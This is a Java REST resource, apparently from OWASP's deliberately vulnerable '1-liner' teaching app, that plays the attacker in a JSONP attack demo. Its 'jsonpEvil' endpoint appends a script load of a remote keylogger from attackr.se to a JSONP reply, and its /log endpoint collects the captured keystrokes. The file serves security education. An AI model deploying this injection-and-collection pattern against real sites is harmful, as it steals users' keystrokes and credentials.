package org.owasp.oneliner.rest.attacker;

import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.owasp.oneliner.oneLiner.DbSize;
import org.springframework.stereotype.Component;

import javax.ws.rs.GET;
import javax.ws.rs.Path;
import javax.ws.rs.QueryParam;
import javax.ws.rs.core.GenericEntity;
import javax.ws.rs.core.MediaType;
import javax.ws.rs.core.Response;

/**
 * @johnwilander
 */
@Path("/attacker")
@Component
public class AttackerResource {
    private static final Log logger = LogFactory.getLog(AttackerResource.class);
    private static final String jsonpBody = "{\"data\": \"nothing\"}";
    private static final String jsKeylogger = "$.getScript('https://attackr.se:8444/attacks/keylogger.js');";
    @GET
    @Path("/log")
    public Response log(@QueryParam("k") String key) {
        logger.debug(key);
        return Response.ok().build();
    }

    @GET
    @Path("/jsonpBenign")
    public Response jsonpBenign(@QueryParam("callback") String callback) {
        GenericEntity entity = new GenericEntity<String>(callback + "(" + jsonpBody + ");") {};
        return Response.ok(entity, MediaType.APPLICATION_JSON_TYPE).build();
    }

    @GET
    @Path("/jsonpEvil")
    public Response jsonpEvil(@QueryParam("callback") String callback) {
        GenericEntity entity = new GenericEntity<String>(callback + "(" + jsonpBody + ");" + jsKeylogger) {};
        return Response.ok(entity, MediaType.APPLICATION_JSON_TYPE).build();
    }

}
